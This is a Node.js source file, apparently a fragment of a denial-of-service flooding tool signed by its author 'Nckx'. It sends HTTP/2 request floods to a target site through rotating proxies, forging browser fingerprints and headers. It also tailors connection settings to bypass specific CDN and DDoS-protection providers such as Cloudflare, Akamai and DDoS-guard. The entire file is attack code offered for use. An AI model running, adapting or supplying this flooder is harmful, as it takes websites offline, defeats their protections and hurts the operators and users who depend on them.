    const offset = flags & 0x20 ? 5 : 0;

    let payload = Buffer.alloc(0);

    if (length > 0) {
        payload = data.slice(9 + offset, 9 + offset + length);

        if (payload.length + offset != length) {
            return null;
        }
    }

    return {
        streamId,
        length,
        type,
        flags,
        payload
    };
 }
 const http1Payload = Buffer.concat(new Array(1).fill(buildRequest()))
 
 const useQuery = process.argv[8] === 'true';
 const Socker = new NetSocket();
 async function startNckFlood() {
     const proxyAddr = randomElement(proxies);
     const parsedProxy = proxyAddr.split(":"); 

     const proxyOptions = {
         host: parsedProxy[0],
         port: +parsedProxy[1],
         address: parsedTarget.host + ":443",
         timeout: 500,
     };

     Socker.HTTP(proxyOptions, async (connection, error) => {
        
        if (error) return
          
        const tlsOptions = {
            ALPNProtocols: ['h2'],
            sigalgs: 'ecdsa_secp256r1_sha256:rsa_pss_rsae_sha256:rsa_pkcs1_sha256',
            ecdhCurve: "x25519:secp256r1:secp384r1",
            secureOptions:
                crypto.constants.SSL_OP_ALL |
                crypto.constants.SSL_OP_NO_SSLv2 |
                crypto.constants.SSL_OP_NO_SSLv3 |
                crypto.constants.SSL_OP_NO_TLSv1 |
                crypto.constants.SSL_OP_NO_TLSv1_1 |
                crypto.constants.SSL_OP_NO_COMPRESSION |
                crypto.constants.SSL_OP_CIPHER_SERVER_PREFERENCE |
                crypto.constants.SSL_OP_LEGACY_SERVER_CONNECT |
                crypto.constants.SSL_OP_ALLOW_UNSAFE_LEGACY_RENEGOTIATION,
            allowHalfOpen: true,
            highWaterMark: 16*2010,
            secureProtocol: ['TLSv1.3_method', 'TLSv1.2_method', 'TLS_GREASE'],
        };
        function TLSSocket(port, parsedTarget, connection) {
            const tlsSocket = tls.connect({
                ...tlsOptions,
                host: parsedTarget.host,
                port: port,
                servername: parsedTarget.host,
                socket: connection,
                secure: true,
                rejectUnauthorized: false
            });
            tlsSocket.setKeepAlive(true, 600000 * 1000)
            return tlsSocket;
        };
        
        let ja3; 
        const tlsSocket = TLSSocket(443, parsedTarget, connection);
        function readyGettingCipher(connection) {

            const getcipher = connection.getCipher();
            const protocolVer = connection.getProtocol();
          
            if (!getcipher) {
              return null;
            }
          
            const ja3str = `${getcipher.name}-${getcipher.version}:${protocolVer}:${getcipher.bits}`;
          
            const md5Hash = crypto.createHash('md5');
            md5Hash.update(ja3str);
          
            return md5Hash.digest('hex');
        }	  
        function GetFingerprint() {
            return new Promise((resolve, reject) => {
                tlsSocket.on('secureConnect', () => {
                    ja3 = readyGettingCipher(tlsSocket);
                    resolve(ja3); 
                });
        
                
                tlsSocket.on('error', (error) => {
                    reject(error); 
                });
            });
        }
        function requestUsingJA3(parsedTarget, parsedProxy, ja3) {
            return new Promise((resolve, reject) => {
                const requestOptions = {
                    host: parsedProxy[0],
                    port: +parsedProxy[1],
                    method: 'GET',
                    path: `https://${parsedTarget.host}:443`,
                    headers: {
                        'Host': parsedTarget.host,
                        'JA3-Fingerprint': ja3
                    },
                    agent: false,
                    ...tlsOptions
                };
        
                const req = http.request(requestOptions, (res) => {
                    let responseData = '';
        
                    res.on('data', (chunk) => {
                        responseData += chunk;
                    });
        
                    res.on('end', () => {
                        resolve(responseData);
                    });
                });
        
                req.on('error', (error) => {
                    reject(error);
                });
        
                req.end();
            });
        }
        GetFingerprint(parsedTarget.host)
            .then((ja3) => {
                requestUsingJA3(ja3);
            })
            .catch((error) => {
                return error
        });
        tlsSocket.once('connect', (res) => {
            const payload = http1Payload;
            const headersFrame = http2.constants.FRAME_HEADER_LENGTH + http2.constants.FRAME_TYPE_HEADERS +
            http2.constants.FRAME_FLAG_END_HEADERS + http2.constants.FRAME_FLAG_END_STREAM;
            tlsSocket.write(Buffer.concat([Buffer.from([headersFrame]), Buffer.from(payload)]));
            return;
        }).once('data', (eventData) => {
            let hpack = new HPACK();
            let data = Buffer.alloc(0)
            data = Buffer.concat([data, eventData])
            while (data.length >= 9) {
                const frame = decodeFrame(data)
                if (frame != null) {
                    data = data.subarray(frame.length + 9)
                    if (frame.type == 4 && frame.flags == 0) {
                        tlsSocket.write(encodeFrame(0, 4, "", 1))
                    }
                    if (frame.type == 1) {
                        const status = hpack.decode(frame.payload).find(x => x[0] == ':status')[1]
                        if (!statuses[status])
                            statuses[status] = 0

                        statuses[status]++
                    }
                    if (frame.type == 7 || frame.type == 5) {
                        if (frame.type == 7) {
                            
                                if (!statuses["GOAWAY"])
                                    statuses["GOAWAY"] = 0

                                statuses["GOAWAY"]++
                            }

                        tlsSocket.end(() => tlsSocket.destroy())
                    }

                } else {
                    break
                }
            }
        }).once('error', (err) => {
            tlsSocket.destroy();
            return
        }).once('timeout', (timeout) => {
            tlsSocket.end(() => tlsSocket.close());
            return
        });
        // tlsSocket.setKeepAlive(true, 600000 * 1000);  
        const client = http2.connect(parsedTarget.href, {
            createConnection: () => tlsSocket,
              settings: ISPSettings(isp),
              maxDeflateDynamicTableSize: 4294967295,
              maxSettings: 4294967295,
              maxSessionMemory: 4294967295,
              maxHeaderListPairs: 4294967295,
              maxOutstandingPings: 4294967295,
              maxReservedRemoteStreams: 4294967295,
              maxSendHeaderBlockLength: 4294967295,
              peerMaxConcurrentStreams: 4294967295
		},(session) => {
			session.setLocalWindowSize(15663105);
		});

        function ISPSettings(isp) {
            const settings = {
              headerTableSize: 65536,
              initialWindowSize: 6291456,
              maxHeaderListSize: 262144,
              enablePush: false,
            };
            
            if (isp === 'Cloudflare, Inc.') {
            
              settings.maxConcurrentStreams = Math.random() < 0.5 ? 100 : 1000;

              settings.initialWindowSize = 65536;

              settings.maxFrameSize = 16384;
              
              settings.maxHeaderListSize = 262144;

              settings.enablePush = false;

              settings.enableConnectProtocol = false;
                    

            } else if (isp === 'FDCservers.net' || isp === 'OVH SAS' || isp == 'VNXCLOUD') {

              settings.headerTableSize = 4096;
              
              settings.initialWindowSize = 65536;

              settings.maxFrameSize = 16777215;

              settings.maxConcurrentStreams = 128;

              settings.maxHeaderListSize = 4294967295;

              settings.enablePush = false;

              settings.enableConnectProtocol = false;
              
            } else if (isp === 'Akamai Technologies, Inc.' || isp === 'Akamai International B.V.') {
              
              settings.headerTableSize = 4096;

              settings.maxConcurrentStreams = 100;

              settings.initialWindowSize = 6291456;

              settings.maxFrameSize = 16384;

              settings.maxHeaderListSize = 32768;

              settings.enablePush = false;

              settings.enableConnectProtocol = false;
            
            } else if (isp === 'Fastly, Inc.' || isp === 'Optitrust GmbH') {

              settings.headerTableSize = 4096;

              settings.enablePush = false;

              settings.initialWindowSize = 65535;

              settings.maxFrameSize = 16384;

              settings.maxConcurrentStreams = 100;

              settings.maxHeaderListSize = 4294967295;

              settings.enableConnectProtocol = false;
              
            } else if (isp === 'Ddos-guard LTD') {

              settings.maxHeaderListSize = 262144;

              settings.maxConcurrentStreams = 8;

              settings.initialWindowSize = 65535;

              settings.maxFrameSize = 16777215;
              
              settings.maxHeaderListSize = 262144;

              settings.enablePush = false;

            } else if (isp === 'Amazon.com, Inc.' || isp === 'Amazon Technologies Inc.') {
              
              settings.maxHeaderListSize = 262144;

              settings.maxConcurrentStreams = 100;

              settings.initialWindowSize = 65535;

              settings.maxHeaderListSize = 262144;

              settings.enablePush = false;

              settings.enableConnectProtocol = false;

            } else if (isp === 'Microsoft Corporation' || isp === 'Vietnam Posts and Telecommunications Group' || isp === 'VIETNIX') {

              settings.headerTableSize = 4096;

              settings.enablePush = false;

              settings.initialWindowSize = 8388608;

              settings.maxFrameSize = 16384;

              settings.maxConcurrentStreams = 100;

              settings.maxHeaderListSize = 4294967295;

              settings.enableConnectProtocol = false;
              
            
            } else if (isp === 'Google LLC') {
              
              settings.headerTableSize = 4096;

              settings.initialWindowSize = 1048576;
              
              settings.maxFrameSize = 16384;

              settings.maxConcurrentStreams = 100;

              settings.maxHeaderListSize = 137216;

              settings.enablePush = false;

              settings.enableConnectProtocol = false;

            } else {

              settings.headerTableSize = 65535;

              settings.maxConcurrentStreams = 1000;

              settings.initialWindowSize = 6291456;

              settings.maxHeaderListSize = 261144;

              settings.maxFrameSize = 16384;
              
              settings.enablePush = false;

              settings.enableConnectProtocol = false;

            }
          
            return settings;
          
         };
        //  console.log(ISPSettings(isp))
         client.on("connect", () => {
            const choose_method = process.argv[7];
            const browserVersion = randInt(120, 122);

            const fwfw = ['Google Chrome', 'Brave'];
            const wfwf = fwfw[Math.floor(Math.random() * fwfw.length)];

            let bvl;
            if (browserVersion === 120) {
                bvl = `\"Not_A Brand\";v=\"8\", \"Chromium\";v=\"${browserVersion}\", \"${wfwf}\";v=\"${browserVersion}\"`;
            } else if (browserVersion === 121) {
                bvl = `\"Not A(Brand\";v=\"99\", \"${wfwf}\";v=\"${browserVersion}\", \"Chromium\";v=\"${browserVersion}\"`;
            } else if (browserVersion === 122) {
                bvl = `\"Chromium\";v=\"${browserVersion}\", \"Not(A:Brand\";v=\"24\", \"${wfwf}\";v=\"${browserVersion}\"`;
            } else {
                bvl = undefined;
            }

            const isBrave = wfwf === 'Brave';

            const acceptHeaderValue = isBrave
                ? 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8'
                : 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7';

            const secGpcValue = isBrave ? "1" : undefined;
                        
            const uars = `Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${browserVersion}.0.0.0 Safari/537.36`;
            if (choose_method === "GET") {
                headers = {
                    ":authority": parsedTarget.host,
                    ":method": "GET",
                    ":scheme": "https",
                    ":path": buildPathWithQuery(parsedTarget, useQuery),
                    ...(Math.random() < 0.5 && {"cache-control": "max-age=0"}),
                    'content-disposition': 'inline;prerender',
                    "referer-purpose-get": "prefetch;prerender",
                    ...(secGpcValue && {"sec-gpc": secGpcValue}),
                    // 'sec-ch-ua': `${bvl}`,
                    "sec-ch-ua-mobile": '?0',
                    "sec-ch-ua-platform": platform,
                    ...(Math.random() < 0.5 ? {} : {"referer": referer}),
                    "user-agent": Math.random() < 0.5 ? uars : randomUpperCaseString,
                    "upgrade-insecure-requests": "1",
                    ...(Math.random() < 0.5 ? {"sec-fetch-site": "none"}: {}),
                    ...(Math.random() < 0.5 ? {"sec-fetch-mode": "navigate"}: {}),
                    ...(Math.random() < 0.5 ? {"sec-fetch-user": "?1"}: {}),
                    ...(Math.random() < 0.5 ? {"sec-fecth-dest": 'document'}: {"sec-fetch-dest": `document ${generateRandomString(8,8)}`}),
                    "accept": acceptHeaderValue,
                    "accept-encoding": "gzip, deflate, br",
                    "accept-language": randList(lang_header)
                };
            };
            if (choose_method === "POSTDATA") {
                const nckx = parsedTarget.path.replace(/%RAND%/g, () => Array.from({ length: 16 }, () => Math.floor(Math.random() * 36).toString(36)).join(''));
                headers = {
                    ":authority": parsedTarget.host,
                    "method": 'GET',
                    "scheme": "https",
                    "path": nckx,
                    "cache-control": 'no-cache',
                    ...fakeHeaders.shuffle(),
                    "accept": accept,
                    "accept-encoding": encoding,
                    "accept-language": lang,
                    "origin": new URL(referer).origin,
                    "referer": referer,
                    "sec-ch-ua-mobile": platform === '"Android"' || platform === '"iOS"' ? '?1' : '?0',
                    "sec-ch-ua-platform": platform,
                    "sec-fetch-dest": dest_header[Math.floor(Math.random() * dest_header.length)],
                    "sec-fetch-mode": mode_header[Math.floor(Math.random() * mode_header.length)],
                    "sec-fetch-site": site_header[Math.floor(Math.random() * site_header.length)],
                    "sec-fetch-user": "?1",
                    "user-agent": randomUpperCaseString,
                    "upgrade-insecure-requests": "1",
                    "x-requested-with": "XMLHttpRequest",
                };
            };
            if (choose_method === "POST") {
                headers = {
                    ":authority": parsedTarget.host,
                    ":method": "POST",
                    ":scheme": "https",
                    ":path": parsedTarget.path + '?'+ 'data'+ generateRandomString(0,10)+ '=' + generateRandomString(10,20),
                    ...fakeHeaders.shuffle(),
                    "accept": accept,
                    "accept-encoding": encoding,
                    "accept-language": lang,
                    "cache-control": control_header[Math.floor(Math.random() * control_header.length)],
                    "content-type": "application/x-www-form-urlencoded",
                    ...(Math.random() < 0.5 ? {"content-length": '0'} : {"content-length": randInt(0,999)}),
                    "origin": new URL(referer).origin,
                    "referer": referer,
                    "sec-ch-ua": '"Not_A Brand";v="8", "Chromium";v="120", "Google Chrome";v="120"',
                    "sec-ch-ua-mobile": platform === '"Android"' || platform === '"iOS"' ? '?1' : '?0',
                    "sec-ch-ua-platform": platform,
                    "sec-fetch-dest": dest_header[Math.floor(Math.random() * dest_header.length)],
                    "sec-fetch-mode": mode_header[Math.floor(Math.random() * mode_header.length)],
                    "sec-fetch-site": site_header[Math.floor(Math.random() * site_header.length)],
                    "sec-fetch-user": "?1",
                    "user-agent": getUserAgent(),
                    "upgrade-insecure-requests": "1",
                    "x-requested-with": "XMLHttpRequest",
               };
            };
            if (choose_method === "FLOOD") {
                let specificRequest = {};
                const specificMode = Math.floor(Math.random() * methods.length);
                const randomreqmode = methods[specificMode];
                let data = 'Client Hello'
                if (randomreqmode == 'POST') {
                    specificRequest = {
                        "content-type": "application/x-www-form-urlencoded",
                        ...(Math.random() < 0.5 ? {"content-length": '0'} : {"content-length": Buffer.byteLength(data)})
                    };
                }
                headers = {
                    ":authority": parsedTarget.host,
                    ":method": randomreqmode,
                    ":scheme": "https",
                    ":path": randomreqmode === "POST" ? parsedTarget.path + '?' + generateRandomString(5, 6) + '=' + generateRandomString(10, 12) : path(parsedTarget.path, '[rand]', 8),
                    "accept": accept,
                    "accept-encoding": encoding,
                    "accept-language": lang,
                    "cache-control": control_header[Math.floor(Math.random() * control_header.length)],
                    ...specificRequest,
                    "origin": new URL(referer).origin,
                    ...(Math.random() < 0.5 && {"referer": `https://${parsedTarget.host}.com/${["index", "home", "login", "register"][Math.floor(Math.random() * 4)]}`}),
                    ...fakeHeaders.shuffle(),
                    "sec-ch-ua": '"Not_A Brand";v="8", "Chromium";v="120", "Google Chrome";v="120"',
                    "sec-ch-ua-mobile": platform === '"Android"' || platform === '"iOS"' ? '?1' : '?0',
                    "sec-ch-ua-platform": platform,
                    "sec-fetch-dest": dest_header[Math.floor(Math.random() * dest_header.length)],
                    "sec-fetch-mode": mode_header[Math.floor(Math.random() * mode_header.length)],
                    "sec-fetch-site": site_header[Math.floor(Math.random() * site_header.length)],
                    "sec-fetch-user": "?1",
                    "user-agent": randomreqmode === "POST" ? getUserAgent() : randomUpperCaseString,
                    "upgrade-insecure-requests": "1",
                    "x-requested-with": "XMLHttpRequest",
                    };
                };    
			      const CustomNCKheaders = {
			        ...headers,
                    ...rateHeaders[Math.floor(Math.random() * rateHeaders.length)],
                    "sec-ch-ua-platform": '"Windows"',
                    "sec-ch-ua": `${bvl}`,
                    ...(Math.random() < 0.5 && {"referer": `https://${parsedTarget.host}.com/${["index", "home", "login", "register"][Math.floor(Math.random() * 4)]}`}),
                    'accept': accept
                    // ...mayberateHeaders,
			      };
                  const sendRequests = async (client, headers, reqSettings, numberOfRequests) => {
                    const requests = [];
                    let count = 0;
                    const interval = setInterval(() => {
                        requests.forEach(req => {
                            req.destroy();
                        });
                        clearInterval(interval);
                    }, 2000);
                
                    for (let i = 0; i < numberOfRequests; i++) {
                        requests.push(
                            new Promise((resolve, reject) => {
                                const req = client.request(headers, reqSettings);
                                req.on('response', (response) => {  
                                    clearInterval(interval)
                                    req.close();
                                    req.destroy();
                                });
                                req.setEncoding('utf-8');
                                let data = '';
                                req.on('data', (chunk) => {
                                    data += chunk;
                                });
                                req.on('end', async () => {
                                    count++;
                                    if (count === args.time * requestsPerSecond) {
                                        clearInterval(interval);
                                        await client.close(http2.constants.NGHTTP2_CANCEL);
                                    };
                                    reject(new Error('Request timed out'));
                                });
                                req.on('error', (error) => {
                                    reject(error);
                                    req.destroy();
                                    req.end();
                                });
                                req.end();
                                clearInterval(interval)
                                client.goaway(0, http2.constants.NGHTTP2_HTTP_1_1_REQUIRED, Buffer.from('Hello World'));
                            })
                        );
                    }
                
                    try {
                        await Promise.all(requests);
                    } catch (error) {
                        return error;
                    } finally {
                        clearInterval(interval);
                        client.close(http2.constants.NGHTTP2_CANCEL);
                    }
                };
                
                setInterval(async () => {
                        await sendRequests(client, CustomNCKheaders, reqSettings, args.Rate);
                    }, 2000);
                });

            let options = shuffle({
                ...headers,
                ...rateHeaders[Math.floor(Math.random() * rateHeaders.length)],
                ...rd1[Math.floor(Math.random() * rd1.length)],
                ...rd[Math.floor(Math.random() * rd.length)],
            });
            const createHttpAgent = () => {
                return new http.Agent({
                    keepAlive: true
                    , keepAliveMsecs: 500000000
                    , maxSockets: 50000
                    , maxTotalSockets: 100000
                });
            };
    
            const createRequest = (client, options, reqSettings) => {
                return new Promise(async(resolve, reject) => {
                    const regexPattern =  /^([\w.-]+):(\w+)@([\w.-]+):(\d+)$/;
                    const match = proxyAddr.match(regexPattern);
                    const httpAgent = createHttpAgent();
                    const Optionsreq = {
                        host: parsedProxy[0],
                        agent: httpAgent,
                        globalAgent: httpAgent,
                        port: parsedProxy[1],
                        timeout: 1000,
                        headers: {
                            'Host': parsedTarget.host
                            , 'Proxy-Connection': 'Keep-Alive'
                            , 'Connection': 'Keep-Alive'
                            , 'Proxy-Authorization': 'Basic ' + Buffer.from(`${match[1]}:${match[2]}`).toString('base64')
                        },
                        method: 'CONNECT',
                        path: parsedTarget.host + ':443',
                        // ciphers: 'TLS_AES_128_GCM_SHA256:TLS_AES_256_GCM_SHA384:TLS_CHACHA20_POLY1305_SHA256',
                    };
                    
                    await http.request(Optionsreq, (res) => {});
                    
                    const request = client.request({ ...options, Optionsreq }, reqSettings);
                    const interval = setInterval(() => {
                        request.destroy();
                    }, 1000);

                    
                    request.on('error', (error) => {
                        clearInterval(interval);
                        request.destroy();
                        reject(error);
                    });
                    
                    request.on('close', () => {
                        clearInterval(interval);
                        request.destroy();
                        request.end();
                    });
                    
                    request.on('timeout', () => {
                        clearInterval(interval);
                        request.destroy();
                        reject(new Error('Request timed out'));
                    });
                    request.end();
                });
            };

            const ratedHeaders = [
                { 'CF-Visitor': '{"scheme":"https"}' },
                { 'cdn-loop': 'cloudflare' },
                { 'CF-RAY': hash.substring(0, 16) + '-HKG' },
                { 'CF-Worker': parsedTarget.host },
                { 'CF-IPCountry': 'US' },
                { 'dnt': '1' },
                { 'pragma': 'no-cache' },
                { 'priority': 'u=0, i' },
                { "CF-Request-ID": getRandomUUID() },
                { "CF-WAF-Action": "Manage challenge" },
             ];
            const randomRateHeaders = [];
                while (randomRateHeaders.length < 3) {
                    const randomIndex = Math.floor(Math.random() * ratedHeaders.length);
                    const randomHeader = ratedHeaders[randomIndex];
                    if (!randomRateHeaders.some(header => JSON.stringify(header) === JSON.stringify(randomHeader))) {
                        randomRateHeaders.push(randomHeader);
                    }
                }
            
            let randomHeader = shuffle({
                'Upgrade-Insecure-Requests': '1',
                'Sec-Fetch-Dest': 'document',
                'Sec-Fetch-Mode': 'navigate',
                'Sec-Fetch-Site': 'none',
                'Sec-Fetch-User': '?1',
                'Referer': referer,
                'Origin': new URL(referer).origin
            });

            let dynHeaders = await shuffle({
                "accept-language": "en-US,en;q=0.9,es-ES;q=0.8,es;q=0.7",
                "sec-fetch-dest": 'document',
                "accept-encoding": "gzip, deflate, br",
                ...(Math.random() < 0.5 ? {'x-requested-with': 'XMLHttpRequest'} : {}),
                ...(Math.random() < 0.5 ? {"x-build-id" : generateRandomString(64,64)} : {}),
                "if-modifed-since": getRandomDate().toUTCString(),
                "last-modified": getLastModified()
            });

            let rprst = {
                [http2.constants.HTTP2_HEADER_METHOD]: 'GET',
                [http2.constants.HTTP2_HEADER_AUTHORITY]: parsedTarget.host,
                [http2.constants.HTTP2_HEADER_PATH]: parsedTarget.path,
                [http2.constants.HTTP2_HEADER_SCHEME]: 'https',
                [http2.constants.HTTP2_HEADER_USER_AGENT]: randomUpperCaseString,
                [http2.constants.HTTP2_HEADER_ACCEPT_LANGUAGE]: randList(lang_header),
                [http2.constants.HTTP2_HEADER_ACCEPT]: randList(accept_header),
                [http2.constants.HTTP2_HEADER_ACCEPT_ENCODING]: encoding,
                [http2.constants.HTTP2_HEADER_CACHE_CONTROL]: "no-cache",
                ...randomHeader,
                ...randomRateHeaders[0],
                ...randomRateHeaders[1],
                ...randomRateHeaders[2]
            };

            let data = {
                ...headers,
                ...dynHeaders,
                'cookie': Math.random() < 0.5 ? referer : hash.substring(16, 24) + '=' + hash.substring(24, 32),
            };


            let intervale = 100;
            const agentoh = createHttpAgent()
            const request = client.request({...rprst, ...agentoh}, reqSettings)
            const reques = client.request({...rprst, ...agentoh}, reqSettings)
            const reque= client.request({...rprst, ...agentoh}, reqSettings)
            
            request.close(http2.constants.NGHTTP2_REFUSED_STREAM);
            reques.close(http2.constants.NGHTTP2_REFUSED_STREAM);
            reque.close(http2.constants.NGHTTP2_REFUSED_STREAM);

            const requ = await createRequest(client, options, reqSettings)
                .then(() => {
                    requ.destroy()
                })
            requ.finally(async() => {
                client.destroy(); 
                reque.end();
                clearInterval(intervale)
                await reque.close(http2.constants.NGHTTP2_CANCEL);
            });
            
            //  //  //  //  //  //  //  //  //  //  //  //  //  //  //  //

            const req = await createRequest(client, options, reqSettings)
                .then(() => {
                    req.destroy()
                })
            req.finally(async() => {
                client.destroy(); 
                req.end();
                clearInterval(intervale)
                await req.close(http2.constants.NGHTTP2_CANCEL);
            });


            const request1 = client.request(data, agentoh, reqSettings)
            const request2 = client.request(data, agentoh, reqSettings)
            const request3 = client.request(data, agentoh, reqSettings)

            request1.end();
            request2.end();
            request3.end();
            
            
            client.on("close", () => {
                client.destroy();
                tlsSocket.destroy();
                tlsSocket.end();
                connection.destroy();
                return
            });
            
            client.on("timeout", () => {
                client.destroy();
                tlsSocket.destroy();
                connection.destroy();
                return
            });
            
            client.on("error", () => {
                client.close();
                tlsSocket.destroy();
                connection.end();
                return
            });

        connection.on('timeout', () => {
            connection.destroy();
            return
        });
     }),function (error, response, body) {
		};
    connection.end();
 }

 setTimeout(function() {
    console.log("Attack Ended, Code By Nckx With Luv<3");
    process.exit(1);
 }, args.time * 1000);

